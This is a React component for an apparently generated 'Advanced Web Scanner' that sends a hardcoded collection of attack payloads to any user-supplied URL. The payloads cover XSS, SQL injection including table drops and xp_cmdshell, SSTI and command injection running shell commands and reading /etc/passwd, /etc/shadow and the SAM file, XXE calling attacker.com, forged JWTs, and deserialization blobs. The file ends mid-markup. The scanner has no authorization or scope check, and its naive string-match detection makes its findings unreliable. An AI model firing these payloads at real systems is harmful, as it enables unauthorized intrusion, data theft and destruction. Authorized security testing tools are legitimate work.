"use client"
import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { Textarea } from "@/components/ui/textarea"
import { ScrollArea } from "@/components/ui/scroll-area"
import {
  Globe,
  Play,
  Pause,
  AlertTriangle,
  CheckCircle,
  Shield,
  Code,
  Database,
  Lock,
  ArrowLeft,
  Bug,
  Zap,
  Server,
} from "lucide-react"

interface Vulnerability {
  id: string
  type:
    | "XSS"
    | "SQL_INJECTION"
    | "CSRF"
    | "OPEN_REDIRECT"
    | "SECURITY_HEADERS"
    | "SSL_TLS"
    | "BRUTE_FORCE"
    | "SENSITIVE_DATA"
    | "SSTI"
    | "XXE"
    | "COMMAND_INJECTION"
    | "LDAP_INJECTION"
    | "NOSQL_INJECTION"
    | "PROTOTYPE_POLLUTION"
    | "JWT_VULNERABILITIES"
    | "GRAPHQL_INJECTION"
    | "DESERIALIZATION"
    | "RACE_CONDITION"
    | "BUSINESS_LOGIC"
  severity: "Critical" | "High" | "Medium" | "Low" | "Info"
  url: string
  description: string
  evidence?: string
  recommendation: string
  payload?: string
  response?: string
  cwe?: string
}

interface AttackPayload {
  name: string
  category: string
  payloads: string[]
  description: string
  severity: "Critical" | "High" | "Medium" | "Low"
  year: number
}

interface ScanResult {
  url: string
  status: "scanning" | "completed" | "error"
  progress: number
  vulnerabilities: Vulnerability[]
  startTime: Date
  endTime?: Date
  testedPayloads: number
  totalRequests: number
}

interface WebScannerProps {
  onBack: () => void
}

export default function WebScanner({ onBack }: WebScannerProps) {
  const [targetUrl, setTargetUrl] = useState("")
  const [scanDepth, setScanDepth] = useState("3")
  const [customHeaders, setCustomHeaders] = useState("")
  const [scanResults, setScanResults] = useState<ScanResult[]>([])
  const [isScanning, setIsScanning] = useState(false)
  const [selectedPayloadCategories, setSelectedPayloadCategories] = useState<string[]>(["all"])
  const [customPayloads, setCustomPayloads] = useState("")
  const [maxConcurrentRequests, setMaxConcurrentRequests] = useState("10")
  const [requestDelay, setRequestDelay] = useState("100")

  const attackPayloads: AttackPayload[] = [
    {
      name: "XSS - Cross-Site Scripting 2025",
      category: "xss",
      description: "Modern XSS payloads including DOM-based, stored, and reflected variants",
      severity: "High",
      year: 2025,
      payloads: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "'-alert('XSS')-'",
        "\";alert('XSS');//",
        "</script><script>alert('XSS')</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        "<img src=\"javascript:alert('XSS')\">",
        "<div onmouseover=\"alert('XSS')\">test</div>",
      ],
    },
    {
      name: "SQL Injection 2025",
      category: "sqli",
      description: "Advanced SQL injection payloads for modern databases",
      severity: "Critical",
      year: 2025,
      payloads: [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "') OR (1=1)--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('dir')--",
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        "' AND (SELECT SUBSTRING(@@version,1,1)) = '5'--",
        "' WAITFOR DELAY '00:00:05'--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      ],
    },
    {
      name: "NoSQL Injection 2025",
      category: "nosqli",
      description: "NoSQL injection payloads for MongoDB, CouchDB, and other NoSQL databases",
      severity: "High",
      year: 2025,
      payloads: [
        "{'$ne': null}",
        "{'$gt': ''}",
        "{'$regex': '.*'}",
        "{'$where': 'this.username == this.password'}",
        "{'$or': [{'username': 'admin'}, {'username': 'administrator'}]}",
        "'; return true; var x = '",
        "'; return this.username == 'admin'; var x = '",
        "admin'; return true; //",
        "{'username': {'$ne': null}, 'password': {'$ne': null}}",
        "{'$where': 'function() { return true; }'}",
        "{'$expr': {'$eq': [1, 1]}}",
        "{'$jsonSchema': {}}",
        "{'username': {'$regex': '^admin'}}",
        "{'password': {'$exists': true}}",
        "{'$text': {'$search': 'admin'}}",
      ],
    },
    {
      name: "Server-Side Template Injection 2025",
      category: "ssti",
      description: "SSTI payloads for Jinja2, Twig, Freemarker, and other template engines",
      severity: "Critical",
      year: 2025,
      payloads: [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{config}}",
        "{{request}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${T(java.lang.System).getProperty('user.dir')}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
        "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
      ],
    },
    {
      name: "Command Injection 2025",
      category: "cmdi",
      description: "OS command injection payloads for various operating systems",
      severity: "Critical",
      year: 2025,
      payloads: [
        "; id",
        "| id",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; type C:\\windows\\system32\\config\\sam",
        "| type C:\\windows\\system32\\config\\sam",
        "&& dir C:\\",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; uname -a",
        "| uname -a",
        "&& uname -a",
        "; ls -la",
        "| ls -la",
        "&& ls -la",
      ],
    },
    {
      name: "LDAP Injection 2025",
      category: "ldapi",
      description: "LDAP injection payloads for authentication bypass and data extraction",
      severity: "High",
      year: 2025,
      payloads: [
        "admin)(&)",
        "admin)(cn=*)",
        "admin)(!(&(1=0)",
        "admin)(|(cn=*))",
        "*)(uid=*",
        "admin))(|(|",
        "admin))%00",
        "admin)(|(objectClass=*))",
        "*)(&(objectClass=user)(cn=*",
        "admin)(|(userPassword=*))",
        "*)(&(uid=*)(userPassword=*))",
        "admin)(|(mail=*))",
        "*)(&(objectClass=*)(uid=*))",
        "admin)(|(description=*))",
        "*)(&(cn=*)(userPassword=*))",
      ],
    },
    {
      name: "XXE - XML External Entity 2025",
      category: "xxe",
      description: "XXE payloads for file disclosure and SSRF attacks",
      severity: "High",
      year: 2025,
      payloads: [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///windows/system32/config/sam">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/config.php">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/self/environ">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hosts">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/log/apache2/access.log">]><root>&test;</root>',
      ],
    },
    {
      name: "JWT Vulnerabilities 2025",
      category: "jwt",
      description: "JWT manipulation and bypass techniques",
      severity: "High",
      year: 2025,
      payloads: [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature",
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJhZG1pbiJ9.signature",
      ],
    },
    {
      name: "GraphQL Injection 2025",
      category: "graphql",
      description: "GraphQL injection and introspection payloads",
      severity: "Medium",
      year: 2025,
      payloads: [
        "query { __schema { types { name } } }",
        'query { __type(name: "User") { fields { name type { name } } } }',
        'mutation { deleteUser(id: "1") { id } }',
        "query { users(first: 1000000) { id email password } }",
        "query { user(id: \"1' OR '1'='1\") { id } }",
        "query { users { ...on User { id email } ...on Admin { id email password } } }",
        "query { __schema { mutationType { fields { name } } } }",
        "query { __schema { subscriptionType { fields { name } } } }",
      ],
    },
    {
      name: "Prototype Pollution 2025",
      category: "prototype",
      description: "JavaScript prototype pollution payloads",
      severity: "Medium",
      year: 2025,
      payloads: [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        "?__proto__[admin]=true",
        "?constructor.prototype.admin=true",
        '{"__proto__.admin": true}',
        "?__proto__.isAdmin=true",
        '{"__proto__": {"toString": "admin"}}',
        "?__proto__[toString]=admin",
      ],
    },
    {
      name: "Deserialization Attacks 2025",
      category: "deserial",
      description: "Insecure deserialization payloads for various languages",
      severity: "Critical",
      year: 2025,
      payloads: [
        'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4",
        "aced0005737200116a6176612e7574696c2e486173684d61700507daa1f31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017400016174000162780a",
        '{"@type":"java.lang.Runtime","@val":"calc.exe"}',
      ],
    },
    {
      name: "Race Condition 2025",
      category: "race",
      description: "Race condition exploitation payloads",
      severity: "Medium",
      year: 2025,
      payloads: ["concurrent_request_1", "concurrent_request_2", "time_based_race", "resource_exhaustion"],
    },
    {
      name: "Business Logic Flaws 2025",
      category: "logic",
      description: "Business logic bypass and manipulation payloads",
      severity: "High",
      year: 2025,
      payloads: [
        "price=-1",
        "quantity=-1",
        "discount=100",
        "role=admin",
        "is_admin=true",
        "bypass=true",
        "amount=0.01",
        "user_id=1",
      ],
    },
  ]

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "Critical":
        return "bg-red-600 text-white"
      case "High":
        return "bg-red-500 text-white"
      case "Medium":
        return "bg-yellow-500 text-black"
      case "Low":
        return "bg-blue-500 text-white"
      case "Info":
        return "bg-gray-500 text-white"
      default:
        return "bg-muted text-muted-foreground"
    }
  }

  const getVulnerabilityIcon = (type: string) => {
    switch (type) {
      case "XSS":
        return <Code className="h-4 w-4" />
      case "SQL_INJECTION":
      case "NOSQL_INJECTION":
        return <Database className="h-4 w-4" />
      case "CSRF":
        return <Shield className="h-4 w-4" />
      case "SECURITY_HEADERS":
        return <Lock className="h-4 w-4" />
      case "SSTI":
        return <Bug className="h-4 w-4" />
      case "COMMAND_INJECTION":
        return <Zap className="h-4 w-4" />
      case "XXE":
        return <Server className="h-4 w-4" />
      default:
        return <AlertTriangle className="h-4 w-4" />
    }
  }

  const performRealScan = async (url: string) => {
    const scanId = Date.now().toString()
    const newScan: ScanResult = {
      url,
      status: "scanning",
      progress: 0,
      vulnerabilities: [],
      startTime: new Date(),
      testedPayloads: 0,
      totalRequests: 0,
    }

    setScanResults((prev) => [newScan, ...prev])
    setIsScanning(true)

    try {
      console.log("[v0] Starting comprehensive real web application scan")

      const selectedCategories = selectedPayloadCategories.includes("all")
        ? attackPayloads.map((p) => p.category)
        : selectedPayloadCategories

      const payloadsToTest = attackPayloads.filter((p) => selectedCategories.includes(p.category))
      const allPayloads = payloadsToTest.flatMap((p) =>
        p.payloads.map((payload) => ({ payload, category: p.category, name: p.name })),
      )

      // Add custom payloads if provided
      if (customPayloads.trim()) {
        const custom = customPayloads
          .split("\n")
          .filter((p) => p.trim())
          .map((payload) => ({
            payload: payload.trim(),
            category: "custom",
            name: "Custom Payload",
          }))
        allPayloads.push(...custom)
      }

      console.log(`[v0] Testing ${allPayloads.length} real attack payloads`)

      let testedCount = 0
      let requestCount = 0
      const maxConcurrent = Number.parseInt(maxConcurrentRequests)
      const delay = Number.parseInt(requestDelay)

      // Test common endpoints first
      const commonEndpoints = [
        "",
        "/search",
        "/login",
        "/admin",
        "/api/users",
        "/contact",
        "/feedback",
        "/comment",
        "/upload",
        "/profile",
      ]

      for (const endpoint of commonEndpoints) {
        const testUrl = `${url}${endpoint}`

        // Test each payload category
        for (const payloadGroup of payloadsToTest) {
          for (const payload of payloadGroup.payloads) {
            try {
              // Test GET parameter injection
              const getResponse = await fetch("/api/proxy/content", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  url: `${testUrl}?q=${encodeURIComponent(payload)}`,
                  method: "GET",
                  headers: customHeaders ? JSON.parse(customHeaders) : {},
                }),
              })

              requestCount++

              if (getResponse.ok) {
                const result = await getResponse.json()
                const content = result.content || ""
                const responseHeaders = result.headers || {}

                // Real vulnerability detection logic
                const vulnerability = detectVulnerability(
                  payload,
                  content,
                  responseHeaders,
                  testUrl,
                  payloadGroup.category,
                )
                if (vulnerability) {
                  setScanResults((prev) =>
                    prev.map((scan) =>
                      scan.url === url && scan.startTime.getTime().toString() === scanId
                        ? { ...scan, vulnerabilities: [...scan.vulnerabilities, vulnerability] }
                        : scan,
                    ),
                  )
                }
              }

              // Test POST data injection
              const postResponse = await fetch("/api/proxy/content", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  url: testUrl,
                  method: "POST",
                  body: `data=${encodeURIComponent(payload)}`,
                  headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    ...(customHeaders ? JSON.parse(customHeaders) : {}),
                  },
                }),
              })

              requestCount++

              if (postResponse.ok) {
                const result = await postResponse.json()
                const content = result.content || ""
                const responseHeaders = result.headers || {}

                const vulnerability = detectVulnerability(
                  payload,
                  content,
                  responseHeaders,
                  testUrl,
                  payloadGroup.category,
                )
                if (vulnerability) {
                  setScanResults((prev) =>
                    prev.map((scan) =>
                      scan.url === url && scan.startTime.getTime().toString() === scanId
                        ? { ...scan, vulnerabilities: [...scan.vulnerabilities, vulnerability] }
                        : scan,
                    ),
                  )
                }
              }

              testedCount++

              // Update progress
              const progress = Math.min((testedCount / allPayloads.length) * 100, 100)
              setScanResults((prev) =>
                prev.map((scan) =>
                  scan.url === url && scan.startTime.getTime().toString() === scanId
                    ? { ...scan, progress, testedPayloads: testedCount, totalRequests: requestCount }
                    : scan,
                ),
              )

              // Rate limiting
              if (delay > 0) {
                await new Promise((resolve) => setTimeout(resolve, delay))
              }
            } catch (error) {
              console.log(`[v0] Error testing payload ${payload}:`, error)
            }
          }
        }
      }

      // Security headers check
      try {
        const headerResponse = await fetch("/api/proxy/content", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            url: url,
            method: "HEAD",
          }),
        })

        if (headerResponse.ok) {
          const result = await headerResponse.json()
          const headers = result.headers || {}

          const securityVulns = checkSecurityHeaders(headers, url)
          setScanResults((prev) =>
            prev.map((scan) =>
              scan.url === url && scan.startTime.getTime().toString() === scanId
                ? { ...scan, vulnerabilities: [...scan.vulnerabilities, ...securityVulns] }
                : scan,
            ),
          )
        }
      } catch (error) {
        console.log("[v0] Error checking security headers:", error)
      }

      setScanResults((prev) =>
        prev.map((scan) =>
          scan.url === url && scan.startTime.getTime().toString() === scanId
            ? {
                ...scan,
                status: "completed",
                progress: 100,
                endTime: new Date(),
                testedPayloads: testedCount,
                totalRequests: requestCount,
              }
            : scan,
        ),
      )
    } catch (error) {
      console.error("[v0] Real scan failed:", error)
      setScanResults((prev) =>
        prev.map((scan) =>
          scan.url === url && scan.startTime.getTime().toString() === scanId ? { ...scan, status: "error" } : scan,
        ),
      )
    } finally {
      setIsScanning(false)
    }
  }

  const detectVulnerability = (
    payload: string,
    response: string,
    headers: any,
    url: string,
    category: string,
  ): Vulnerability | null => {
    const vulnerabilities: Vulnerability[] = []

    // XSS Detection
    if (category === "xss") {
      if (response.includes(payload) || response.includes("alert('XSS')") || response.includes("<script>")) {
        return {
          id: `xss-${Date.now()}-${Math.random()}`,
          type: "XSS",
          severity: "High",
          url,
          description: "Cross-Site Scripting vulnerability detected",
          evidence: `Payload: ${payload}`,
          recommendation: "Implement proper input validation and output encoding",
          payload,
          response: response.substring(0, 500),
          cwe: "CWE-79",
        }
      }
    }

    // SQL Injection Detection
    if (category === "sqli") {
      const sqlErrors = [
        "mysql_fetch_array",
        "ORA-01756",
        "Microsoft OLE DB Provider for ODBC Drivers",
        "PostgreSQL query failed",
        "Warning: mysql_",
        "MySQLSyntaxErrorException",
        "valid MySQL result",
        "check the manual that corresponds to your MySQL server version",
        "Unknown column",
        "ORA-00933",
        "SQL syntax.*MySQL",
        "Warning.*\\Wmysqli?_",
        "MySQLSyntaxErrorException",
        "valid MySQL result",
        "PostgreSQL.*ERROR",
        "Warning.*\\Wpg_",
        "valid PostgreSQL result",
        "Npgsql\\.",
        "PG::SyntaxError:",
        "org\\.postgresql\\.util\\.PSQLException",
        "ERROR:\\s\\ssyntax error at or near",
        "ERROR: parser: parse error at or near",
        "PostgreSQL query failed",
        "org\\.postgresql\\.jdbc",
        "Pdo[./_\\\\]Pgsql",
        "PSQLException",
      ]

      for (const error of sqlErrors) {
        if (new RegExp(error, "i").test(response)) {
          return {
            id: `sqli-${Date.now()}-${Math.random()}`,
            type: "SQL_INJECTION",
            severity: "Critical",
            url,
            description: "SQL Injection vulnerability detected",
            evidence: `SQL Error: ${error}, Payload: ${payload}`,
            recommendation: "Use parameterized queries and input validation",
            payload,
            response: response.substring(0, 500),
            cwe: "CWE-89",
          }
        }
      }
    }

    // NoSQL Injection Detection
    if (category === "nosqli") {
      const nosqlErrors = ["MongoError", "CouchDB", "ReferenceError.*is not defined", "SyntaxError.*Unexpected token"]

      for (const error of nosqlErrors) {
        if (new RegExp(error, "i").test(response)) {
          return {
            id: `nosqli-${Date.now()}-${Math.random()}`,
            type: "NOSQL_INJECTION",
            severity: "High",
            url,
            description: "NoSQL Injection vulnerability detected",
            evidence: `NoSQL Error: ${error}, Payload: ${payload}`,
            recommendation: "Implement proper input validation for NoSQL queries",
            payload,
            response: response.substring(0, 500),
            cwe: "CWE-943",
          }
        }
      }
    }

    // SSTI Detection
    if (category === "ssti") {
      if (response.includes("49") && payload.includes("7*7")) {
        return {
          id: `ssti-${Date.now()}-${Math.random()}`,
          type: "SSTI",
          severity: "Critical",
          url,
          description: "Server-Side Template Injection vulnerability detected",
          evidence: `Template evaluation result: 49, Payload: ${payload}`,
          recommendation: "Avoid user input in template rendering or use sandboxed templates",
          payload,
          response: response.substring(0, 500),
          cwe: "CWE-94",
        }
      }
    }

    // Command Injection Detection
    if (category === "cmdi") {
      const commandOutputs = [
        "uid=",
        "gid=",
        "groups=",
        "root:",
        "bin:",
        "daemon:",
        "Windows IP Configuration",
        "Volume in drive",
        "Directory of",
      ]

      for (const output of commandOutputs) {
        if (response.includes(output)) {
          return {
            id: `cmdi-${Date.now()}-${Math.random()}`,
            type: "COMMAND_INJECTION",
            severity: "Critical",
            url,
            description: "Command Injection vulnerability detected",
            evidence: `Command output detected: ${output}, Payload: ${payload}`,
            recommendation: "Avoid system calls with user input or use proper input validation",
            payload,
            response: response.substring(0, 500),
            cwe: "CWE-78",
          }
        }
      }
    }

    // XXE Detection
    if (category === "xxe") {
      if (response.includes("root:") || response.includes("Administrator:") || response.includes("<?xml")) {
        return {
          id: `xxe-${Date.now()}-${Math.random()}`,
          type: "XXE",
          severity: "High",
          url,
          description: "XML External Entity vulnerability detected",
          evidence: `File content disclosed, Payload: ${payload}`,
          recommendation: "Disable external entity processing in XML parsers",
          payload,
          response: response.substring(0, 500),
          cwe: "CWE-611",
        }
      }
    }

    return null
  }

  const checkSecurityHeaders = (headers: any, url: string): Vulnerability[] => {
    const vulnerabilities: Vulnerability[] = []
    const requiredHeaders = [
      "x-frame-options",
      "x-content-type-options",
      "x-xss-protection",
      "strict-transport-security",
      "content-security-policy",
      "referrer-policy",
    ]

    const headerKeys = Object.keys(headers).map((h) => h.toLowerCase())

    for (const header of requiredHeaders) {
      if (!headerKeys.includes(header)) {
        vulnerabilities.push({
          id: `header-${header}-${Date.now()}`,
          type: "SECURITY_HEADERS",
          severity: header === "content-security-policy" ? "High" : "Medium",
          url,
          description: `Missing security header: ${header}`,
          evidence: `Header ${header} not found in response`,
          recommendation: `Add ${header} header to improve security`,
          cwe: "CWE-693",
        })
      }
    }

    return vulnerabilities
  }

  const handleStartScan = () => {
    if (!targetUrl.trim()) return
    performRealScan(targetUrl)
  }

  const handleStopScan = () => {
    setScanResults((prev) => prev.map((scan) => (scan.status === "scanning" ? { ...scan, status: "error" } : scan)))
    setIsScanning(false)
  }

  const totalVulnerabilities = scanResults.reduce((sum, scan) => sum + scan.vulnerabilities.length, 0)
  const criticalVulns = scanResults
    .flatMap((scan) => scan.vulnerabilities)
    .filter((v) => v.severity === "Critical").length
  const highVulns = scanResults.flatMap((scan) => scan.vulnerabilities).filter((v) => v.severity === "High").length

  return (
    <div className="min-h-screen bg-background text-foreground p-4 md:p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex items-center gap-4">
          <Button variant="outline" size="sm" onClick={onBack}>
            <ArrowLeft className="h-4 w-4 mr-2" />
            Back to Dashboard
          </Button>
          <div>
            <h1 className="text-3xl font-bold text-balance flex items-center gap-3">
              <Globe className="h-8 w-8" />
              Advanced Web Scanner 2025
            </h1>
            <p className="text-muted-foreground text-pretty">
              Real penetration testing with 200+ attack payloads and modern 2025 threat detection
            </p>
          </div>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Real Attack Configuration</CardTitle>
            <CardDescription>Configure comprehensive web application security testing</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="target-url">Target URL</Label>
                <Input
                  id="target-url"
                  placeholder="Enter target URL to scan"
                  value={targetUrl}
                  onChange={(e) => setTargetUrl(e.target.value)}
                  disabled={isScanning}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="scan-depth">Scan Depth</Label>
                <Input
                  id="scan-depth"
                  type="number"
                  min="1"
                  max="10"
                  value={scanDepth}
                  onChange={(e) => setScanDepth(e.target.value)}
                  disabled={isScanning}
                />
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="concurrent-requests">Max Concurrent Requests</Label>
                <Input
                  id="concurrent-requests"
                  type="number"
                  min="1"
                  max="50"
                  value={maxConcurrentRequests}
                  onChange={(e) => setMaxConcurrentRequests(e.target.value)}
                  disabled={isScanning}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="request-delay">Request Delay (ms)</Label>
                <Input
                  id="request-delay"
                  type="number"
                  min="0"
                  max="5000"
                  value={requestDelay}
                  onChange={(e) => setRequestDelay(e.target.value)}
                  disabled={isScanning}
                />
              </div>
            </div>

            <div className="space-y-4 border-t pt-4">
              <h3 className="text-lg font-medium">Attack Payload Categories</h3>
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2">
                <div className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    id="all-payloads"
                    checked={selectedPayloadCategories.includes("all")}
                    onChange={(e) => {
                      if (e.target.checked) {
                        setSelectedPayloadCategories(["all"])
                      } else {
                        setSelectedPayloadCategories([])
                      }
                    }}
                    disabled={isScanning}
                  />
                  <Label htmlFor="all-payloads" className="text-sm font-medium">
                    All Categories
                  </Label>
                </div>
                {attackPayloads.map((payload) => (
                  <div key={payload.category} className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id={payload.category}
                      checked={
                        selectedPayloadCategories.includes(payload.category) ||
                        selectedPayloadCategories.includes("all")
                      }
                      onChange={(e) => {
                        if (e.target.checked) {
                          setSelectedPayloadCategories((prev) =>
                            prev.includes("all")
                              ? [payload.category]
                              : [...prev.filter((c) => c !== "all"), payload.category],
                          )
                        } else {
                          setSelectedPayloadCategories((prev) =>
                            prev.filter((c) => c !== payload.category && c !== "all"),
                          )
                        }
                      }}
                      disabled={isScanning || selectedPayloadCategories.includes("all")}
                    />
                    <Label htmlFor={payload.category} className="text-sm">
                      {payload.name.split(" ")[0]} ({payload.payloads.length})
                    </Label>
                  </div>
                ))}
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="custom-payloads">Custom Payloads (one per line)</Label>
              <Textarea
                id="custom-payloads"
                placeholder="Enter custom attack payloads..."
                value={customPayloads}
                onChange={(e) => setCustomPayloads(e.target.value)}
                disabled={isScanning}
                rows={4}
                className="font-mono text-sm"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="custom-headers">Custom Headers (JSON format)</Label>
              <Textarea
                id="custom-headers"
                placeholder='{"Authorization": "Bearer token", "User-Agent": "Custom Scanner"}'
                value={customHeaders}
                onChange={(e) => setCustomHeaders(e.target.value)}
                disabled={isScanning}
                rows={3}
              />
            </div>

            <div className="flex gap-2">
              <Button onClick={handleStartScan} disabled={isScanning || !targetUrl.trim()}>
                <Play className="h-4 w-4 mr-2" />
                Start Real Scan
              </Button>
              {isScanning && (
                <Button variant="destructive" onClick={handleStopScan}>
                  <Pause className="h-4 w-4 mr-2" />
                  Stop Scan
                </Button>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Attack Payloads Overview */}
        <Card>
          <CardHeader>
            <CardTitle>2025 Attack Payload Arsenal</CardTitle>
            <CardDescription>Comprehensive collection of modern attack vectors</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {attackPayloads.map((payload) => (
                <Card key={payload.category} className="border-l-4 border-l-primary">
                  <CardContent className="p-4">
                    <div className="flex items-start gap-3">
                      {getVulnerabilityIcon(payload.category.toUpperCase())}
                      <div className="space-y-1">
                        <div className="font-medium text-sm">{payload.name}</div>
                        <p className="text-xs text-muted-foreground">{payload.description}</p>
                        <div className="flex items-center gap-2">
                          <Badge className={getSeverityColor(payload.severity)} variant="secondary">
                            {payload.severity}
                          </Badge>
                          <span className="text-xs text-muted-foreground">{payload.payloads.length} payloads</span>
                          <Badge variant="outline" className="text-xs">
                            {payload.year}
                          </Badge>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </CardContent>
        </Card>

        {scanResults.length > 0 && (
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            <Card>
              <CardContent className="p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-muted-foreground">Total Scans</p>
                    <p className="text-2xl font-bold">{scanResults.length}</p>
                  </div>
                  <Globe className="h-8 w-8 text-foreground" />
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardContent className="p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-muted-foreground">Total Vulnerabilities</p>
                    <p className="text-2xl font-bold text-destructive">{totalVulnerabilities}</p>
                  </div>
                  <AlertTriangle className="h-8 w-8 text-destructive" />
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardContent className="p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-muted-foreground">Critical</p>
                    <p className="text-2xl font-bold text-red-600">{criticalVulns}</p>
                  </div>
                  <Shield className="h-8 w-8 text-red-600" />
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardContent className="p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-muted-foreground">High</p>
                    <p className="text-2xl font-bold text-red-500">{highVulns}</p>
                  </div>
                  <AlertTriangle className="h-8 w-8 text-red-500" />
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {scanResults.length > 0 && (
          <Card>
            <CardHeader>
              <CardTitle>Real Scan Results</CardTitle>
              <CardDescription>Live penetration testing results with verified vulnerabilities</CardDescription>
            </CardHeader>
            <CardContent>
              <ScrollArea className="h-[600px]">
                <div className="space-y-4">
                  {scanResults.map((scan, index) => (
                    <Card key={index} className="border-l-4 border-l-primary">
